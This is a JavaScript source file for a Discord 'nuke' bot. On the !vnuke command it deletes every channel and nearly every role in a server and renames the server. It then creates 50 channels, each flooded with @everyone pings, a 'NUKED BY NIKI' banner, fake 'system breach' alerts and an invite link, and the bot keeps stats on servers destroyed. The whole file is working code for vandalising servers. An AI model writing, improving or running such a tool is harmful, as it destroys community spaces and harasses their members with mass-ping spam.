require('dotenv').config();
const { Client, GatewayIntentBits, PermissionsBitField, ChannelType, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.DirectMessages
    ]
});

const PREFIX = process.env.PREFIX || '!';
const AUTHORIZED_ID = "1474433573174907054";

// ============================================================
// STATS
// ============================================================
let totalNukes = 0;
let totalChannelsDeleted = 0;
let totalRolesDeleted = 0;
let totalChannelsCreated = 0;
let statsChannelId = null;
let statsMessageId = null;

// ============================================================
// ASCII BANNER
// ============================================================
const ASCII_BANNER = `
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║    ███╗   ██╗██╗██╗  ██╗██╗      █████╗ ██╗██╗         ║
║    ████╗  ██║██║██║ ██╔╝██║     ██╔══██╗██║██║         ║
║    ██╔██╗ ██║██║█████╔╝ ██║     ███████║██║██║         ║
║    ██║╚██╗██║██║██╔═██╗ ██║     ██╔══██║██║██║         ║
║    ██║ ╚████║██║██║  ██╗███████╗██║  ██║██║██║         ║
║    ╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝         ║
║                                                           ║
║              💀  NUKED BY NIKI  💀                       ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
`;

const VICTORY_MESSAGES = [
    '@everyone @here\n\n**NIKI ON TOP !**\n**NIKI RULES !**\n**NIKI IS THE KING !**\n\nTHIS SERVER HAS BEEN DESTROYED',
    '@everyone @here\n\n**NIKI IS UNSTOPPABLE !**\n**NIKI DESTROYED THIS SERVER !**\n\n**NIKI ON TOP !**',
    '@everyone @here\n\n**NIKI ON TOP !**\n**NIKI ON TOP !**\n**NIKI ON TOP !**\n\nTHIS SERVER IS NOW NIKI\'S PROPERTY'
];

const SCARY_MESSAGES = [
    '@everyone @here\n\n=== SYSTEM OVERRIDE ===\n\n[!] ALL CHANNELS PERMANENTLY DESTROYED\n[!] ALL ROLES DELETED\n[!] SERVER STRUCTURE COMPROMISED\n\nACCESS DENIED PERMANENTLY',
    '@everyone @here\n\n=== CRITICAL SYSTEM FAILURE ===\n\n[!] ROOT ACCESS GRANTED TO NIKI\n[!] ALL DATA WIPED\n[!] RESTORATION IMPOSSIBLE\n\nSYSTEM SHUTDOWN',
    '@everyone @here\n\n=== SECURITY BREACH ===\n\n[!] UNAUTHORIZED ACCESS: NIKI\n[!] ALL PERMISSIONS REVOKED\n[!] CHANNEL STRUCTURE DESTROYED\n\nOPERATION COMPLETE'
];

const HACKER_IMAGES = [
    'https://i.imgur.com/2wI8t0V.png',
    'https://i.imgur.com/3hqP4G6.png',
    'https://i.imgur.com/5VjN7pK.png'
];

const SCARY_NAMES = [
    'N1K1-0N-T0P-01', 'N1K1-RUL3S-02', 'N1K1-K1NG-03', 'N1K1-G04T-04', 'N1K1-L3G3ND-05',
    'N1K1-W1NS-06', 'N1K1-D3STR0YS-07', 'N1K1-UNST0PP4BL3-08', 'N1K1-G0D-09', 'N1K1-0N-T0P-10',
    'T3RM1N4T3D-11', 'D3L3T3D-12', 'C0RRUPT3D-13', 'SYST3M-F41LUR3-14', '4CC3SS-D3N13D-15',
    'D3STR0Y3D-16', 'PURG3D-17', '3R4S3D-18', '0V3RR1DD3N-19', 'C0MPR0M1S3D-20',
    '1NF3CT3D-21', 'H4CK3D-22', 'BR34CH3D-23', 'D3T0N4T3D-24', 'N3UTR4L1Z3D-25',
    '4NNH1L4T3D-26', '0BL1T3R4T3D-27', '3XT1NGU1SH3D-28', 'D3C1M4T3D-29', '3XT3RM1N4T3D-30',
    'L1QU1D4T3D-31', '3R4D1C4T3D-32', 'V4P0R1Z3D-33', '3XPL0D3D-34', 'SH4TT3R3D-35',
    'CRUSH3D-36', 'D1SM4NTL3D-37', 'SCR4PP3D-38', 'TR4SH3D-39', 'G4RB4G3D-40',
    'NUK3D-41', 'R4Z3D-42', 'L3V3L3D-43', 'FL4TT3N3D-44', 'GR0UND3D-45',
    'T3RM1N4L-46', 'F4T4L-47', 'CR1T1C4L-48', '3M3RG3NCY-49', 'D1S4ST3R-50'
];

const inviteLink = 'https://discord.gg/eVTU7sW3wv';

// ============================================================
// UPDATE STATS CHANNEL
// ============================================================
async function updateStatsChannel() {
    if (!statsChannelId) return;

    try {
        const channel = await client.channels.fetch(statsChannelId);
        if (!channel) return;

        const embed = new EmbedBuilder()
            .setColor(0x00FF00)
            .setTitle('☠ NIKI NUKE STATS ☠')
            .setDescription('**BOT STATUS: ONLINE**\n🟢 **LIVE**')
            .addFields(
                { name: '💀 Total Nukes', value: `${totalNukes}`, inline: true },
                { name: '🗑️ Channels Deleted', value: `${totalChannelsDeleted}`, inline: true },
                { name: '🎭 Roles Deleted', value: `${totalRolesDeleted}`, inline: true },
                { name: '📝 Channels Created', value: `${totalChannelsCreated}`, inline: true },
                { name: '📊 Servers', value: `${client.guilds.cache.size}`, inline: true },
                { name: '👤 Authorized User', value: `<@${AUTHORIZED_ID}>`, inline: true }
            )
            .setFooter({ text: 'NIKI ON TOP ☠' })
            .setTimestamp();

        const row = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setLabel('🔄 Refresh Stats')
                    .setStyle(ButtonStyle.Primary)
                    .setCustomId('refresh_stats'),
                new ButtonBuilder()
                    .setLabel('💀 Nuke Stats')
                    .setStyle(ButtonStyle.Danger)
                    .setCustomId('nuke_stats')
            );

        if (statsMessageId) {
            try {
                const msg = await channel.messages.fetch(statsMessageId);
                await msg.edit({ embeds: [embed], components: [row] });
            } catch {
                const msg = await channel.send({ embeds: [embed], components: [row] });
                statsMessageId = msg.id;
            }
        } else {
            const msg = await channel.send({ embeds: [embed], components: [row] });
            statsMessageId = msg.id;
        }
    } catch (e) {
        console.error('Error updating stats channel:', e);
    }
}

// ============================================================
// INTERACTIONS (Buttons)
// ============================================================
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;

    if (interaction.customId === 'refresh_stats') {
        await interaction.deferUpdate();
        await updateStatsChannel();
        await interaction.followUp({ content: '✅ Stats refreshed!', ephemeral: true });
    }

    if (interaction.customId === 'nuke_stats') {
        await interaction.deferUpdate();
        const embed = new EmbedBuilder()
            .setColor(0xFF0000)
            .setTitle('☠ NUKE HISTORY ☠')
            .setDescription(`Total Nukes: ${totalNukes}\nChannels Deleted: ${totalChannelsDeleted}\nRoles Deleted: ${totalRolesDeleted}\nChannels Created: ${totalChannelsCreated}`)
            .setFooter({ text: 'NIKI ON TOP ☠' })
            .setTimestamp();
        await interaction.followUp({ embeds: [embed], ephemeral: true });
    }
});

// ============================================================
// READY EVENT
// ============================================================
client.once('ready', async () => {
    console.log(`✅ Connected as ${client.user.tag}`);
    console.log(`📊 ${client.guilds.cache.size} servers`);
    console.log(`🔧 Prefix: ${PREFIX}`);
    console.log('====================================');
    await updateStatsChannel();
});

// ============================================================
// MESSAGE COMMANDS
// ============================================================
client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'vnuke') {
        await handleNuke(message);
    }

    if (command === 'set') {
        statsChannelId = message.channel.id;
        statsMessageId = null;
        await updateStatsChannel();
        await message.reply('✅ Stats channel set!');
    }
});

// ============================================================
// NUKE FUNCTION (ULTRA RAPIDE)
// ============================================================
async function handleNuke(message) {
    if (message.author.id !== AUTHORIZED_ID) {
        return message.reply('❌ You are not authorized to use this command!');
    }

    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return message.reply('❌ You need administrator permissions!');
    }

    if (!message.guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return message.reply('❌ I need administrator permissions!');
    }

    await message.reply('💀 **NUKE INITIALIZED... (RAPID MODE)**');

    const guild = message.guild;
    const guildName = guild.name;
    let channelsDeleted = 0;
    let rolesDeleted = 0;
    let channelsCreated = 0;

    try {
        // --------------------------------------------------------
        // 1. DELETE ALL CHANNELS (ULTRA RAPIDE)
        // --------------------------------------------------------
        const channels = guild.channels.cache;
        // On crée un tableau de "promesses" de suppression
        const deletePromises = channels.map(async (channel) => {
            try {
                await channel.delete();
                channelsDeleted++;
            } catch (e) {
                // Ignorer les erreurs individuelles
            }
        });
        // On lance TOUTES les suppressions en même temps
        await Promise.all(deletePromises);

        // --------------------------------------------------------
        // 2. DELETE ALL ROLES (except @everyone) (ULTRA RAPIDE)
        // --------------------------------------------------------
        const roles = guild.roles.cache;
        const deleteRolePromises = roles.map(async (role) => {
            if (role.name !== '@everyone' && role.id !== guild.id) {
                try {
                    await role.delete();
                    rolesDeleted++;
                } catch (e) {}
            }
        });
        await Promise.all(deleteRolePromises);

        // 3. RENAME SERVER
        const nukeNumber = Math.floor(Math.random() * 9000) + 1000;
        try {
            await guild.setName(`☠ N1K1-0N-T0P-${nukeNumber} ☠`);
        } catch (e) {}

        // --------------------------------------------------------
        // 4. CREATE 50 NEW CHANNELS (ULTRA RAPIDE)
        // --------------------------------------------------------
        const createPromises = [];
        for (let i = 0; i < 50; i++) {
            const name = SCARY_NAMES[i % SCARY_NAMES.length];
            // On crée la promesse de création mais on ne l'attend pas tout de suite
            const promise = guild.channels.create({
                name: name,
                type: ChannelType.GuildText,
            }).then(async (channel) => {
                // Une fois le salon créé, on envoie tout dedans
                try {
                    await channel.send('```' + ASCII_BANNER + '```');
                    await channel.send(SCARY_MESSAGES[Math.floor(Math.random() * SCARY_MESSAGES.length)]);
                    await channel.send(VICTORY_MESSAGES[Math.floor(Math.random() * VICTORY_MESSAGES.length)]);
                    
                    const embed = new EmbedBuilder()
                        .setColor(0xFF0000)
                        .setTitle('☠ SYSTEM DESTROYED ☠')
                        .setDescription('**NIKI ON TOP !**')
                        .setImage(HACKER_IMAGES[Math.floor(Math.random() * HACKER_IMAGES.length)])
                        .setFooter({ text: 'NIKI RULES ☠' })
                        .setTimestamp();
                    await channel.send({ embeds: [embed] });
                    await channel.send(`**JOIN THE DARK SIDE:**\n${inviteLink}`);
                    
                    channelsCreated++;
                } catch (e) {}
            }).catch(() => {});
            
            createPromises.push(promise);
        }
        // On lance TOUTES les créations en même temps
        await Promise.all(createPromises);

        // 5. CREATE SPECIAL ROLE
        try {
            const role = await guild.roles.create({
                name: '☠ N1K1 0N T0P ☠',
                color: '#FF0000',
                hoist: true,
                mentionable: true
            });
            await guild.members.me.roles.add(role);
        } catch (e) {}

        // 6. UPDATE STATS
        totalNukes++;
        totalChannelsDeleted += channelsDeleted;
        totalRolesDeleted += rolesDeleted;
        totalChannelsCreated += channelsCreated;

        // 7. UPDATE STATS CHANNEL
        await updateStatsChannel();

        // 8. SEND DM WITH STATS
        const dmEmbed = new EmbedBuilder()
            .setColor(0xFF0000)
            .setTitle('☠ NUKE EXECUTED ☠')
            .setDescription(`**TARGET:** ${guildName}`)
            .addFields(
                { name: '💀 Channels Deleted', value: `${channelsDeleted}`, inline: true },
                { name: '🎭 Roles Deleted', value: `${rolesDeleted}`, inline: true },
                { name: '📝 Channels Created', value: `${channelsCreated}`, inline: true },
                { name: '📊 Total Nukes', value: `${totalNukes}`, inline: true }
            )
            .setFooter({ text: 'NIKI ON TOP ☠' })
            .setTimestamp();

        try {
            await message.author.send({ embeds: [dmEmbed] });
        } catch (e) {}

        await message.channel.send(`✅ **NUKE COMPLETE!**\n\n${VICTORY_MESSAGES[0]}\n\n**@everyone @here** THIS SERVER IS NOW NIKI'S PROPERTY`);

    } catch (error) {
        console.error(error);
        await message.channel.send('❌ Error: ' + error.message);
    }
}

client.login(process.env.TOKEN);